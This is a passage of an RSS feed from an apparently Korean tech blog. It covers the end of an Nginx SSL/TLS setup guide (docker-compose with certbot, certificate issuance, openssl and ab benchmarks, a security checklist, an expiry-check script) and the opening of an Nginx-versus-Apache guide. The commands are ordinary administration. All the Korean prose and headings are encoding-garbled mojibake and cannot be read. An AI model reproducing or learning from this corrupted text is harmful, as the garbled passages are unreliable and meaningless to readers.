class="string">nginx:alpine</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;443:443&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./nginx.conf:/etc/nginx/nginx.conf:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./conf.d:/etc/nginx/conf.d:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./ssl:/etc/nginx/ssl:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/letsencrypt:/etc/letsencrypt:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./html:/usr/share/nginx/html:ro</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">certbot:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">certbot/certbot</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/letsencrypt:/etc/letsencrypt</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./html:/usr/share/nginx/html</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">&quot;/bin/sh -c &#x27;trap exit TERM; while :; do certbot renew; sleep 12h &amp; wait $$&#123;!&#125;; done;&#x27;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="ì´ˆê¸°-ì¸ì¦ì„œ-ë°œê¸‰"><a href="#ì´ˆê¸°-ì¸ì¦ì„œ-ë°œê¸‰" class="headerlink" title="ì´ˆê¸° ì¸ì¦ì„œ ë°œê¸‰"></a>ì´ˆê¸° ì¸ì¦ì„œ ë°œê¸‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Certbot ì»¨í…Œì´ë„ˆë¡œ ì¸ì¦ì„œ ë°œê¸‰</span></span><br><span class="line">docker-compose run --<span class="built_in">rm</span> certbot certonly --webroot \</span><br><span class="line">  --webroot-path=/usr/share/nginx/html \</span><br><span class="line">  -d example.com \</span><br><span class="line">  -d www.example.com \</span><br><span class="line">  --email admin@example.com \</span><br><span class="line">  --agree-tos \</span><br><span class="line">  --no-eff-email</span><br></pre></td></tr></table></figure><h2 id="ì„±ëŠ¥-ë²¤ì¹˜ë§ˆí¬"><a href="#ì„±ëŠ¥-ë²¤ì¹˜ë§ˆí¬" class="headerlink" title="ì„±ëŠ¥ ë²¤ì¹˜ë§ˆí¬"></a>ì„±ëŠ¥ ë²¤ì¹˜ë§ˆí¬</h2><h3 id="SSL-TLS-ì„±ëŠ¥-í…ŒìŠ¤íŠ¸"><a href="#SSL-TLS-ì„±ëŠ¥-í…ŒìŠ¤íŠ¸" class="headerlink" title="SSL&#x2F;TLS ì„±ëŠ¥ í…ŒìŠ¤íŠ¸"></a>SSL&#x2F;TLS ì„±ëŠ¥ í…ŒìŠ¤íŠ¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì´ˆë‹¹ ì—°ê²° ìˆ˜ í…ŒìŠ¤íŠ¸</span></span><br><span class="line">openssl s_time -connect example.com:443 -www / -new -time 30</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache Benchë¡œ HTTPS ë¶€í•˜ í…ŒìŠ¤íŠ¸</span></span><br><span class="line">ab -n 1000 -c 100 https://example.com/</span><br></pre></td></tr></table></figure><h3 id="ì„±ëŠ¥-ë¹„êµ"><a href="#ì„±ëŠ¥-ë¹„êµ" class="headerlink" title="ì„±ëŠ¥ ë¹„êµ"></a>ì„±ëŠ¥ ë¹„êµ</h3><table><thead><tr><th>ì„¤ì •</th><th>TPS (Transactions Per Second)</th></tr></thead><tbody><tr><td>HTTP (no SSL)</td><td>~5,000</td></tr><tr><td>HTTPS (TLS 1.2)</td><td>~3,500</td></tr><tr><td>HTTPS (TLS 1.3)</td><td>~4,200</td></tr><tr><td>HTTPS + ì„¸ì…˜ ì¬ì‚¬ìš©</td><td>~4,800</td></tr></tbody></table><h2 id="ë³´ì•ˆ-ì²´í¬ë¦¬ìŠ¤íŠ¸"><a href="#ë³´ì•ˆ-ì²´í¬ë¦¬ìŠ¤íŠ¸" class="headerlink" title="ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸"></a>ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸</h2><ul><li><input disabled="" type="checkbox"> TLS 1.2 ì´ìƒë§Œ ì‚¬ìš©</li><li><input disabled="" type="checkbox"> ê°•ë ¥í•œ ì•”í˜¸í™” ìŠ¤ìœ„íŠ¸ ì„¤ì •</li><li><input disabled="" type="checkbox"> HSTS í—¤ë” ì„¤ì •</li><li><input disabled="" type="checkbox"> OCSP Stapling í™œì„±í™”</li><li><input disabled="" type="checkbox"> Perfect Forward Secrecy (PFS) ì§€ì›</li><li><input disabled="" type="checkbox"> ì¸ì¦ì„œ ìë™ ê°±ì‹  ì„¤ì •</li><li><input disabled="" type="checkbox"> ë³´ì•ˆ í—¤ë” ì„¤ì • (X-Frame-Options, CSP ë“±)</li><li><input disabled="" type="checkbox"> SSL Labsì—ì„œ A+ ë“±ê¸‰ íšë“</li><li><input disabled="" type="checkbox"> HTTPì—ì„œ HTTPSë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸</li><li><input disabled="" type="checkbox"> ì¸ì¦ì„œ ë§Œë£Œ ëª¨ë‹ˆí„°ë§</li></ul><h2 id="ì¸ì¦ì„œ-ëª¨ë‹ˆí„°ë§"><a href="#ì¸ì¦ì„œ-ëª¨ë‹ˆí„°ë§" class="headerlink" title="ì¸ì¦ì„œ ëª¨ë‹ˆí„°ë§"></a>ì¸ì¦ì„œ ëª¨ë‹ˆí„°ë§</h2><h3 id="ë§Œë£Œ-ì•Œë¦¼-ìŠ¤í¬ë¦½íŠ¸"><a href="#ë§Œë£Œ-ì•Œë¦¼-ìŠ¤í¬ë¦½íŠ¸" class="headerlink" title="ë§Œë£Œ ì•Œë¦¼ ìŠ¤í¬ë¦½íŠ¸"></a>ë§Œë£Œ ì•Œë¦¼ ìŠ¤í¬ë¦½íŠ¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># check-ssl-expiry.sh</span></span><br><span class="line"></span><br><span class="line">DOMAIN=<span class="string">&quot;example.com&quot;</span></span><br><span class="line">DAYS_WARN=30</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë§Œë£Œì¼ í™•ì¸</span></span><br><span class="line">EXPIRY_DATE=$(<span class="built_in">echo</span> | openssl s_client -servername <span class="variable">$DOMAIN</span> -connect <span class="variable">$DOMAIN</span>:443 2&gt;/dev/null | openssl x509 -noout -enddate | <span class="built_in">cut</span> -d= -f2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë‚¨ì€ ì¼ìˆ˜ ê³„ì‚°</span></span><br><span class="line">EXPIRY_EPOCH=$(<span class="built_in">date</span> -d <span class="string">&quot;<span class="variable">$EXPIRY_DATE</span>&quot;</span> +%s)</span><br><span class="line">NOW_EPOCH=$(<span class="built_in">date</span> +%s)</span><br><span class="line">DAYS_LEFT=$(( (<span class="variable">$EXPIRY_EPOCH</span> - <span class="variable">$NOW_EPOCH</span>) / <span class="number">86400</span> ))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$DAYS_LEFT</span> -lt <span class="variable">$DAYS_WARN</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Warning: SSL certificate for <span class="variable">$DOMAIN</span> expires in <span class="variable">$DAYS_LEFT</span> days!&quot;</span></span><br><span class="line">    <span class="comment"># ì´ë©”ì¼ ë˜ëŠ” Slack ì•Œë¦¼ ì „ì†¡</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>Cronìœ¼ë¡œ ë§¤ì¼ ì‹¤í–‰:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 9 * * * /path/to/check-ssl-expiry.sh</span><br></pre></td></tr></table></figure><h2 id="ì°¸ê³ -ìë£Œ"><a href="#ì°¸ê³ -ìë£Œ" class="headerlink" title="ì°¸ê³  ìë£Œ"></a>ì°¸ê³  ìë£Œ</h2><ul><li><a href="https://letsencrypt.org/docs/">Letâ€™s Encrypt ê³µì‹ ë¬¸ì„œ</a></li><li><a href="https://ssl-config.mozilla.org/">Mozilla SSL Configuration Generator</a></li><li><a href="https://www.ssllabs.com/ssltest/">SSL Labs Server Test</a></li><li><a href="https://certbot.eff.org/docs/">Certbot ë¬¸ì„œ</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html">OWASP TLS Cheat Sheet</a></li><li><a href="https://nginx.org/en/docs/http/ngx_http_ssl_module.html">Nginx SSL ëª¨ë“ˆ ë¬¸ì„œ</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Infra/">Infra</category>
      
      
      <category domain="https://ckck803.github.io/tags/Security/">Security</category>
      
      <category domain="https://ckck803.github.io/tags/Nginx/">Nginx</category>
      
      <category domain="https://ckck803.github.io/tags/SSL/">SSL</category>
      
      <category domain="https://ckck803.github.io/tags/TLS/">TLS</category>
      
      <category domain="https://ckck803.github.io/tags/HTTPS/">HTTPS</category>
      
      
      <comments>https://ckck803.github.io/2025/12/11/infra/nginx-ssl-guide/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Nginx ì™„ë²½ ê°€ì´ë“œ</title>
      <link>https://ckck803.github.io/2025/12/11/infra/nginx/</link>
      <guid>https://ckck803.github.io/2025/12/11/infra/nginx/</guid>
      <pubDate>Thu, 11 Dec 2025 14:30:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/springboot/sample-board/nginx/nginx.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Nginxë€&quot;&gt;&lt;a href=&quot;#Nginxë€&quot; class=&quot;headerlink&quot; title=&quot;Nginxë€?&quot;&gt;&lt;/a&gt;Nginxë€?&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Nginx&lt;/strong&gt;(ì—”ì§„ì—‘ìŠ¤)ëŠ” 2004ë…„ ëŸ¬ì‹œì•„ ê°œë°œì Igor Sysoevê°€ ë§Œë“  ê³ ì„±ëŠ¥ ì›¹ ì„œë²„ì´ì ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ ì„œë²„ì…ë‹ˆë‹¤. ì²˜ìŒì—ëŠ” Rambler.ruë¼ëŠ” ëŸ¬ì‹œì•„ í¬í„¸ ì‚¬ì´íŠ¸ì˜ C10K ë¬¸ì œ(ë™ì‹œì— 10,000ê°œì˜ ì—°ê²°ì„ ì²˜ë¦¬í•˜ëŠ” ë¬¸ì œ)ë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ ê°œë°œë˜ì—ˆìœ¼ë©°, í˜„ì¬ëŠ” ì „ ì„¸ê³„ ì›¹ì‚¬ì´íŠ¸ì˜ 30% ì´ìƒì—ì„œ ì‚¬ìš©ë˜ê³  ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;p&gt;Apacheê°€ ì˜¤ë«ë™ì•ˆ ì›¹ ì„œë²„ ì‹œì¥ì„ ì§€ë°°í–ˆì§€ë§Œ, NginxëŠ” ë†’ì€ ë™ì‹œ ì ‘ì† ì²˜ë¦¬ ëŠ¥ë ¥ê³¼ ë‚®ì€ ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ìœ¼ë¡œ ë¹ ë¥´ê²Œ ì‹œì¥ ì ìœ ìœ¨ì„ í™•ëŒ€í–ˆìŠµë‹ˆë‹¤. Netflix, Airbnb, GitHub, WordPress.com ë“± íŠ¸ë˜í”½ì´ ë§ì€ ëŒ€í˜• ì‚¬ì´íŠ¸ë“¤ì´ Nginxë¥¼ ì‚¬ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h3 id=&quot;ì£¼ìš”-íŠ¹ì§•&quot;&gt;&lt;a href=&quot;#ì£¼ìš”-íŠ¹ì§•&quot; class=&quot;headerlink&quot; title=&quot;ì£¼ìš” íŠ¹ì§•&quot;&gt;&lt;/a&gt;ì£¼ìš” íŠ¹ì§•&lt;/h3&gt;&lt;h4 id=&quot;1-ë†’ì€-ì„±ëŠ¥ê³¼-í™•ì¥ì„±&quot;&gt;&lt;a href=&quot;#1-ë†’ì€-ì„±ëŠ¥ê³¼-í™•ì¥ì„±&quot; class=&quot;headerlink&quot; title=&quot;1. ë†’ì€ ì„±ëŠ¥ê³¼ í™•ì¥ì„±&quot;&gt;&lt;/a&gt;1. ë†’ì€ ì„±ëŠ¥ê³¼ í™•ì¥ì„±&lt;/h4&gt;&lt;p&gt;NginxëŠ” &lt;strong&gt;ë¹„ë™ê¸° ì´ë²¤íŠ¸ ê¸°ë°˜(Event-Driven) ì•„í‚¤í…ì²˜&lt;/strong&gt;ë¥¼ ì±„íƒí•˜ì—¬ ì ì€ ìˆ˜ì˜ ì›Œì»¤ í”„ë¡œì„¸ìŠ¤ë¡œ ìˆ˜ë§Œ ê°œì˜ ë™ì‹œ ì—°ê²°ì„ ì²˜ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Apacheì˜ í”„ë¡œì„¸ìŠ¤&amp;#x2F;ìŠ¤ë ˆë“œ ê¸°ë°˜ ëª¨ë¸ê³¼ ë‹¬ë¦¬, ê° ì—°ê²°ë§ˆë‹¤ ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤ë‚˜ ìŠ¤ë ˆë“œë¥¼ ìƒì„±í•˜ì§€ ì•Šì•„ ë©”ëª¨ë¦¬ íš¨ìœ¨ì´ ë›°ì–´ë‚©ë‹ˆë‹¤.&lt;/p&gt;
&lt;h4 id=&quot;2-ë‚®ì€-ë¦¬ì†ŒìŠ¤-ì‚¬ìš©&quot;&gt;&lt;a href=&quot;#2-ë‚®ì€-ë¦¬ì†ŒìŠ¤-ì‚¬ìš©&quot; class=&quot;headerlink&quot; title=&quot;2. ë‚®ì€ ë¦¬ì†ŒìŠ¤ ì‚¬ìš©&quot;&gt;&lt;/a&gt;2. ë‚®ì€ ë¦¬ì†ŒìŠ¤ ì‚¬ìš©&lt;/h4&gt;&lt;p&gt;ë™ì¼í•œ íŠ¸ë˜í”½ì„ ì²˜ë¦¬í•  ë•Œ Apache ëŒ€ë¹„ ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ì´ í˜„ì €íˆ ë‚®ìŠµë‹ˆë‹¤. ì´ëŠ” í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ ë¹„ìš© ì ˆê°ìœ¼ë¡œ ì§ê²°ë˜ë©°, ì œí•œëœ ë¦¬ì†ŒìŠ¤ë¥¼ ê°€ì§„ ì„œë²„ì—ì„œë„ ìš°ìˆ˜í•œ ì„±ëŠ¥ì„ ë°œíœ˜í•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;h4 id=&quot;3-í™•ì¥ì„±ê³¼-ëª¨ë“ˆí™”&quot;&gt;&lt;a href=&quot;#3-í™•ì¥ì„±ê³¼-ëª¨ë“ˆí™”&quot; class=&quot;headerlink&quot; title=&quot;3. í™•ì¥ì„±ê³¼ ëª¨ë“ˆí™”&quot;&gt;&lt;/a&gt;3. í™•ì¥ì„±ê³¼ ëª¨ë“ˆí™”&lt;/h4&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/springboot/sample-board/nginx/nginx.png"></p><h2 id="Nginxë€"><a href="#Nginxë€" class="headerlink" title="Nginxë€?"></a>Nginxë€?</h2><p><strong>Nginx</strong>(ì—”ì§„ì—‘ìŠ¤)ëŠ” 2004ë…„ ëŸ¬ì‹œì•„ ê°œë°œì Igor Sysoevê°€ ë§Œë“  ê³ ì„±ëŠ¥ ì›¹ ì„œë²„ì´ì ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ ì„œë²„ì…ë‹ˆë‹¤. ì²˜ìŒì—ëŠ” Rambler.ruë¼ëŠ” ëŸ¬ì‹œì•„ í¬í„¸ ì‚¬ì´íŠ¸ì˜ C10K ë¬¸ì œ(ë™ì‹œì— 10,000ê°œì˜ ì—°ê²°ì„ ì²˜ë¦¬í•˜ëŠ” ë¬¸ì œ)ë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ ê°œë°œë˜ì—ˆìœ¼ë©°, í˜„ì¬ëŠ” ì „ ì„¸ê³„ ì›¹ì‚¬ì´íŠ¸ì˜ 30% ì´ìƒì—ì„œ ì‚¬ìš©ë˜ê³  ìˆìŠµë‹ˆë‹¤.</p><p>Apacheê°€ ì˜¤ë«ë™ì•ˆ ì›¹ ì„œë²„ ì‹œì¥ì„ ì§€ë°°í–ˆì§€ë§Œ, NginxëŠ” ë†’ì€ ë™ì‹œ ì ‘ì† ì²˜ë¦¬ ëŠ¥ë ¥ê³¼ ë‚®ì€ ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ìœ¼ë¡œ ë¹ ë¥´ê²Œ ì‹œì¥ ì ìœ ìœ¨ì„ í™•ëŒ€í–ˆìŠµë‹ˆë‹¤. Netflix, Airbnb, GitHub, WordPress.com ë“± íŠ¸ë˜í”½ì´ ë§ì€ ëŒ€í˜• ì‚¬ì´íŠ¸ë“¤ì´ Nginxë¥¼ ì‚¬ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><h3 id="ì£¼ìš”-íŠ¹ì§•"><a href="#ì£¼ìš”-íŠ¹ì§•" class="headerlink" title="ì£¼ìš” íŠ¹ì§•"></a>ì£¼ìš” íŠ¹ì§•</h3><h4 id="1-ë†’ì€-ì„±ëŠ¥ê³¼-í™•ì¥ì„±"><a href="#1-ë†’ì€-ì„±ëŠ¥ê³¼-í™•ì¥ì„±" class="headerlink" title="1. ë†’ì€ ì„±ëŠ¥ê³¼ í™•ì¥ì„±"></a>1. ë†’ì€ ì„±ëŠ¥ê³¼ í™•ì¥ì„±</h4><p>NginxëŠ” <strong>ë¹„ë™ê¸° ì´ë²¤íŠ¸ ê¸°ë°˜(Event-Driven) ì•„í‚¤í…ì²˜</strong>ë¥¼ ì±„íƒí•˜ì—¬ ì ì€ ìˆ˜ì˜ ì›Œì»¤ í”„ë¡œì„¸ìŠ¤ë¡œ ìˆ˜ë§Œ ê°œì˜ ë™ì‹œ ì—°ê²°ì„ ì²˜ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Apacheì˜ í”„ë¡œì„¸ìŠ¤&#x2F;ìŠ¤ë ˆë“œ ê¸°ë°˜ ëª¨ë¸ê³¼ ë‹¬ë¦¬, ê° ì—°ê²°ë§ˆë‹¤ ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤ë‚˜ ìŠ¤ë ˆë“œë¥¼ ìƒì„±í•˜ì§€ ì•Šì•„ ë©”ëª¨ë¦¬ íš¨ìœ¨ì´ ë›°ì–´ë‚©ë‹ˆë‹¤.</p><h4 id="2-ë‚®ì€-ë¦¬ì†ŒìŠ¤-ì‚¬ìš©"><a href="#2-ë‚®ì€-ë¦¬ì†ŒìŠ¤-ì‚¬ìš©" class="headerlink" title="2. ë‚®ì€ ë¦¬ì†ŒìŠ¤ ì‚¬ìš©"></a>2. ë‚®ì€ ë¦¬ì†ŒìŠ¤ ì‚¬ìš©</h4><p>ë™ì¼í•œ íŠ¸ë˜í”½ì„ ì²˜ë¦¬í•  ë•Œ Apache ëŒ€ë¹„ ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ì´ í˜„ì €íˆ ë‚®ìŠµë‹ˆë‹¤. ì´ëŠ” í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ ë¹„ìš© ì ˆê°ìœ¼ë¡œ ì§ê²°ë˜ë©°, ì œí•œëœ ë¦¬ì†ŒìŠ¤ë¥¼ ê°€ì§„ ì„œë²„ì—ì„œë„ ìš°ìˆ˜í•œ ì„±ëŠ¥ì„ ë°œíœ˜í•©ë‹ˆë‹¤.</p><h4 id="3-í™•ì¥ì„±ê³¼-ëª¨ë“ˆí™”"><a href="#3-í™•ì¥ì„±ê³¼-ëª¨ë“ˆí™”" class="headerlink" title="3. í™•ì¥ì„±ê³¼ ëª¨ë“ˆí™”"></a>3. í™•ì¥ì„±ê³¼ ëª¨ë“ˆí™”</h4><p>ë‹¤ì–‘í•œ ëª¨ë“ˆì„ í†µí•´ ê¸°ëŠ¥ì„ í™•ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ë³¸ ì œê³µë˜ëŠ” ì½”ì–´ ëª¨ë“ˆ ì™¸ì—ë„ ì„œë“œíŒŒí‹° ëª¨ë“ˆì„ ì»´íŒŒì¼í•˜ì—¬ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©°, Nginx Plus(ìƒìš© ë²„ì „)ì—ì„œëŠ” ë”ìš± ê°•ë ¥í•œ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.</p><h4 id="4-ë¬´ì¤‘ë‹¨-ìš´ì˜"><a href="#4-ë¬´ì¤‘ë‹¨-ìš´ì˜" class="headerlink" title="4. ë¬´ì¤‘ë‹¨ ìš´ì˜"></a>4. ë¬´ì¤‘ë‹¨ ìš´ì˜</h4><p>ì„¤ì • íŒŒì¼ì„ ìˆ˜ì •í•œ í›„ <code>nginx -s reload</code> ëª…ë ¹ìœ¼ë¡œ ì„œë¹„ìŠ¤ ì¤‘ë‹¨ ì—†ì´ ìƒˆë¡œìš´ ì„¤ì •ì„ ì ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ ë°”ì´ë„ˆë¦¬ ì—…ê·¸ë ˆì´ë“œë„ ë¬´ì¤‘ë‹¨ìœ¼ë¡œ ê°€ëŠ¥í•˜ì—¬ 24&#x2F;7 ìš´ì˜ì´ í•„ìš”í•œ í™˜ê²½ì— ì í•©í•©ë‹ˆë‹¤.</p><h4 id="5-ë‹¤ì–‘í•œ-ì—­í• -ìˆ˜í–‰"><a href="#5-ë‹¤ì–‘í•œ-ì—­í• -ìˆ˜í–‰" class="headerlink" title="5. ë‹¤ì–‘í•œ ì—­í•  ìˆ˜í–‰"></a>5. ë‹¤ì–‘í•œ ì—­í•  ìˆ˜í–‰</h4><ul><li><strong>ì›¹ ì„œë²„</strong>: ì •ì  íŒŒì¼(HTML, CSS, JavaScript, ì´ë¯¸ì§€)ì„ ë§¤ìš° ë¹ ë¥´ê²Œ ì œê³µ</li><li><strong>ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ</strong>: ë°±ì—”ë“œ ì• í”Œë¦¬ì¼€ì´ì…˜ ì„œë²„ ì•ë‹¨ì—ì„œ ìš”ì²­ì„ ì¤‘ê³„</li><li><strong>ë¡œë“œ ë°¸ëŸ°ì„œ</strong>: ì—¬ëŸ¬ ë°±ì—”ë“œ ì„œë²„ë¡œ íŠ¸ë˜í”½ì„ ë¶„ì‚°</li><li><strong>HTTP ìºì‹œ</strong>: ì‘ë‹µì„ ìºì‹±í•˜ì—¬ ë°±ì—”ë“œ ë¶€í•˜ ê°ì†Œ</li><li><strong>API Gateway</strong>: ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ì•„í‚¤í…ì²˜ì—ì„œ ì§„ì…ì  ì—­í• </li></ul><h2 id="Nginx-vs-Apache-ë¹„êµ"><a href="#Nginx-vs-Apache-ë¹„êµ" class="headerlink" title="Nginx vs Apache ë¹„êµ"></a>Nginx vs Apache ë¹„êµ</h2><p>ì›¹ ì„œë²„ë¥¼ ì„ íƒí•  ë•Œ ê°€ì¥ ë§ì´ ë¹„êµë˜ëŠ” ë‘ ì†”ë£¨ì…˜ì´ Nginxì™€ Apacheì…ë‹ˆë‹¤. ê°ê°ì˜ ì¥ë‹¨ì ì„ ì´í•´í•˜ë©´ í”„ë¡œì íŠ¸ì— ì í•©í•œ ì›¹ ì„œë²„ë¥¼ ì„ íƒí•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.</p><table><thead><tr><th>í•­ëª©</th><th>Nginx</th><th>Apache</th></tr></thead><tbody><tr><td>ì•„í‚¤í…ì²˜</td><td>ì´ë²¤íŠ¸ ê¸°ë°˜ (ë¹„ë™ê¸°)</td><td>í”„ë¡œì„¸ìŠ¤&#x2F;ìŠ¤ë ˆë“œ ê¸°ë°˜ (ë™ê¸°)</td></tr><tr><td>ë™ì‹œ ì ‘ì† ì²˜ë¦¬</td><td>ìš°ìˆ˜</td><td>ë³´í†µ</td></tr><tr><td>ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰</td><td>ë‚®ìŒ</td><td>ë†’ìŒ</td></tr><tr><td>ì •ì  ì½˜í…ì¸  ì œê³µ</td><td>ë§¤ìš° ë¹ ë¦„</td><td>ë³´í†µ</td></tr><tr><td>ë™ì  ì½˜í…ì¸  ì²˜ë¦¬</td><td>í”„ë¡ì‹œ í•„ìš”</td><td>ìì²´ ì²˜ë¦¬ ê°€ëŠ¥</td></tr><tr><td>ì„¤ì • íŒŒì¼</td><td>ê°„ê²°í•¨</td><td>ë³µì¡í•¨ (.htaccess ì§€ì›)</td></tr><tr><td>ëª¨ë“ˆ ì‹œìŠ¤í…œ</td><td>ì •ì  ì»´íŒŒì¼</td><td>ë™ì  ë¡œë”©</td></tr></tbody></table><h3 id="ì–¸ì œ-Nginxë¥¼-ì„ íƒí•´ì•¼-í• ê¹Œ"><a href="#ì–¸ì œ-Nginxë¥¼-ì„ íƒí•´ì•¼-í• ê¹Œ" class="headerlink" title="ì–¸ì œ Nginxë¥¼ ì„ íƒí•´ì•¼ í• ê¹Œ?"></a>ì–¸ì œ Nginxë¥¼ ì„ íƒí•´ì•¼ í• ê¹Œ?</h3><ul><li><strong>ê³ íŠ¸ë˜í”½ ì›¹ì‚¬ì´íŠ¸</strong>: ë™ì‹œ ì ‘ì†ìê°€ ë§ì€ ê²½ìš° (ìˆ˜ì²œ~ìˆ˜ë§Œ ëª…)</li><li><strong>ì •ì  íŒŒì¼ ì„œë¹™</strong>: ì´ë¯¸ì§€, CSS, JavaScript ë“± ì •ì  ìì› ì œê³µì´ ì£¼ëœ ëª©ì </li><li><strong>ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ</strong>: Node.js, Python, Java ë“±ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ ì„œë²„ ì•ë‹¨</li><li><strong>ë¡œë“œ ë°¸ëŸ°ì‹±</strong>: ì—¬ëŸ¬ ë°±ì—”ë“œ ì„œë²„ë¡œ íŠ¸ë˜í”½ ë¶„ì‚° í•„ìš”</li><li><strong>í´ë¼ìš°ë“œ í™˜ê²½</strong>: ë¦¬ì†ŒìŠ¤ íš¨ìœ¨ì´ ì¤‘ìš”í•˜ê³  ë¹„ìš© ì ˆê° í•„ìš”</li></ul><h3 id="ì–¸ì œ-Apacheë¥¼-ì„ íƒí•´ì•¼-í• ê¹Œ"><a href="#ì–¸ì œ-Apacheë¥¼-ì„ íƒí•´ì•¼-í• ê¹Œ" class="headerlink" title="ì–¸ì œ Apacheë¥¼ ì„ íƒí•´ì•¼ í• ê¹Œ?"></a>ì–¸ì œ Apacheë¥¼ ì„ íƒí•´ì•¼ í• ê¹Œ?</h3><ul><li><strong>ë ˆê±°ì‹œ ì• í”Œë¦¬ì¼€ì´ì…˜</strong>: .htaccess ê¸°ë°˜ ì„¤ì •ì— ì˜ì¡´í•˜ëŠ” ê²½ìš°</li><li><strong>PHP ì• í”Œë¦¬ì¼€ì´ì…˜</strong>: mod_phpë¥¼ í†µí•œ PHP ì§ì ‘ ì²˜ë¦¬ê°€ í•„ìš”í•œ ê²½ìš°</li><li><strong>ë‹¤ì–‘í•œ ëª¨ë“ˆ í™œìš©</strong>: ë™ì  ëª¨ë“ˆ ë¡œë”©ìœ¼ë¡œ ìœ ì—°í•œ ê¸°ëŠ¥ í™•ì¥ì´ í•„ìš”</li><li><strong>ê³µìœ  í˜¸ìŠ¤íŒ…</strong>: ë””ë ‰í† ë¦¬ë³„ ê¶Œí•œ ì œì–´ì™€ ì‚¬ìš©ìë³„ ì„¤ì •ì´ ì¤‘ìš”</li><li><strong>ì™„ì „í•œ í˜¸í™˜ì„±</strong>: ì˜¤ë˜ëœ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ì˜ í˜¸í™˜ì„± ìš°ì„ </li></ul><h3 id="ì‹¤ë¬´ì—ì„œì˜-ì„ íƒ"><a href="#ì‹¤ë¬´ì—ì„œì˜-ì„ íƒ" class="headerlink" title="ì‹¤ë¬´ì—ì„œì˜ ì„ íƒ"></a>ì‹¤ë¬´ì—ì„œì˜ ì„ íƒ</h3><p>ë§ì€ í˜„ëŒ€ì ì¸ ì›¹ ì•„í‚¤í…ì²˜ì—ì„œëŠ” <strong>Nginxë¥¼ í”„ë¡ íŠ¸ì—”ë“œ ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ</strong>ë¡œ, <strong>Apacheë‚˜ ë‹¤ë¥¸ ì• í”Œë¦¬ì¼€ì´ì…˜ ì„œë²„ë¥¼ ë°±ì—”ë“œ</strong>ë¡œ í•¨ê»˜ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ëŸ° êµ¬ì„±ìœ¼ë¡œ Nginxì˜ ë¹ ë¥¸ ì •ì  íŒŒì¼ ì„œë¹™ê³¼ íš¨ìœ¨ì ì¸ ì—°ê²° ì²˜ë¦¬, Apacheì˜ ë™ì  ì½˜í…ì¸  ì²˜ë¦¬ 